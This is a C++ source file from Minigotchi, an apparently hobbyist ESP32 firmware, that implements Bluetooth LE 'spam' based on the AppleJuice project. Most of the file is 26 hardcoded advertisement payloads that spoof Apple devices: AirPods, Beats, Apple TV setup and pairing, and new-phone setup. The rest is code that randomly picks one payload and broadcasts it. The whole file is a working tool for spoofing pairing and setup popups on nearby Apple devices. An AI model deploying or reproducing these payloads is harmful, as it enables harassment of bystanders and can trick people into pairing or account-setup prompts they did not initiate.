/*
 * Minigotchi: An even smaller Pwnagotchi
 * Copyright (C) 2024 dj1ch
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

/**
 * ble.cpp: Handles BLE spam
 */

/**
 * Relies off of implementation from:
 * https://github.com/ECTO-1A/AppleJuice/blob/main/ESP32-Arduino/applejuice/applejuice.ino
 *
 * Additional Credit:
 *
 * ESP32 Arduino implementation of Apple Juice*
 * Author: Ronald Stoner
 * Github: https://github.com/ronaldstoner
 */

#include "ble.h"

BLEAdvertising *Ble::pAdvertising;

int Ble::random(int min, int max) { return min + rand() % (max - min + 1); }

// User selectable variables
int Ble::deviceType = Ble::random(
    1, 26); // 1 for Airpods, 2 for Airpods Pro, 3 for Airpods Max, 4 for...
int Ble::delaySeconds = 5; // delay in seconds
int Ble::advType = 2;
// 0 - 0
// 1 - 1 (directed advertisement with high duty cycle)
// 2 - 2
// 3 - ADV_NONCONN_IND
// 4 - 4 (directed advertisement with low duty cycle)

/**
 * Gets first instance of mood class
 */
Mood &Ble::mood = Mood::getInstance();

// Payload data
uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                           0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                           0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAirpodsProGen2[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBuds[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
                             0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                             0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05,
                          0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                          0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06,
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09,
                                0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioPro[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataBeatsStudioBudsPlus[31] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa,
    0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVNewUser[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVAppleIDSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVWirelessAudioSync[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVHomekitSetup[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVKeyboard[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataAppleTVConnectingToNetwork[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c,
                                0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                                 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                                 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTransferNumber[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
uint8_t dataTVColorBalance[23] = {
    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05,
    0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};

/**
 * Initializes bluetooth and sets up payload
 */
void Ble::init() {
  BLEDevice::init("");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Select the appropriate data based on the device type
  uint8_t *data;
  size_t data_len;

  switch (deviceType) {
  case 1: data = dataAirpods; data_len = sizeof(dataAirpods); break;
  case 2: data = dataAirpodsPro; data_len = sizeof(dataAirpodsPro); break;
  case 3: data = dataAirpodsMax; data_len = sizeof(dataAirpodsMax); break;
  case 4: data = dataAirpodsGen2; data_len = sizeof(dataAirpodsGen2); break;
  case 5: data = dataAirpodsGen3; data_len = sizeof(dataAirpodsGen3); break;
  case 6: data = dataAirpodsProGen2; data_len = sizeof(dataAirpodsProGen2); break;
  case 7: data = dataPowerBeats; data_len = sizeof(dataPowerBeats); break;
  case 8: data = dataPowerBeatsPro; data_len = sizeof(dataPowerBeatsPro); break;
  case 9: data = dataBeatsSoloPro; data_len = sizeof(dataBeatsSoloPro); break;
  case 10: data = dataBeatsStudioBuds; data_len = sizeof(dataBeatsStudioBuds); break;
  case 11: data = dataBeatsFlex; data_len = sizeof(dataBeatsFlex); break;
  case 12: data = dataBeatsX; data_len = sizeof(dataBeatsX); break;
  case 13: data = dataBeatsSolo3; data_len = sizeof(dataBeatsSolo3); break;
  case 14: data = dataBeatsStudio3; data_len = sizeof(dataBeatsStudio3); break;
  case 15: data = dataBeatsStudioPro; data_len = sizeof(dataBeatsStudioPro); break;
  case 16: data = dataBeatsFitPro; data_len = sizeof(dataBeatsFitPro); break;
  case 17: data = dataBeatsStudioBudsPlus; data_len = sizeof(dataBeatsStudioBudsPlus); break;
  case 18: data = dataAppleTVSetup; data_len = sizeof(dataAppleTVSetup); break;
  case 19: data = dataAppleTVPair; data_len = sizeof(dataAppleTVPair); break;
  case 20: data = dataAppleTVNewUser; data_len = sizeof(dataAppleTVNewUser); break;
  case 21: data = dataAppleTVAppleIDSetup; data_len = sizeof(dataAppleTVAppleIDSetup); break;
  case 22: data = dataAppleTVWirelessAudioSync; data_len = sizeof(dataAppleTVWirelessAudioSync); break;
  case 23: data = dataAppleTVHomekitSetup; data_len = sizeof(dataAppleTVHomekitSetup); break;
  case 24: data = dataAppleTVKeyboard; data_len = sizeof(dataAppleTVKeyboard); break;
  case 25: data = dataAppleTVConnectingToNetwork; data_len = sizeof(dataAppleTVConnectingToNetwork); break;
  case 26: data = dataTVColorBalance; data_len = sizeof(dataTVColorBalance); break;
  default:
    data = dataAirpods;
    data_len = sizeof(dataAirpods);
    break;
  }

  // Set the advertisement data type
  switch (advType) {
  case 0: pAdvertising->setAdvertisementType(0); break;
  case 1: pAdvertising->setAdvertisementType(1); break;
  case 2: pAdvertising->setAdvertisementType(2); break;
  case 3: pAdvertising->setAdvertisementType(3); break;
  case 4: pAdvertising->setAdvertisementType(4); break;
  }

  // Set the advertisement payload
  oAdvertisementData.addData((char*)data, data_len);
  pAdvertising->setAdvertisementData(oAdvertisementData);
}

/**
 * Starts BLE
 */
void Ble::start() {
  Serial.println(mood.getIntense() + " Starting BLE Spam...");
  Display::updateDisplay(mood.getIntense(), "Starting BLE Spam...");
  pAdvertising->start();
  delay(delaySeconds * 1000);
  pAdvertising->stop();
  Display::updateDisplay(mood.getNeutral(), "BLE Spam Stopped");
  Serial.println(mood.getNeutral() + " BLE Spam Stopped");
}

/**
 * *Manually* stops BLE spam if it is already running
 */
void Ble::stop() { pAdvertising->stop(); }

/**
 * Self explanatory...
 */
void Ble::spam() {
  if (Config::spam) {
    Ble::init();
    Ble::start();
  } else {
    // do nothing
  }
}
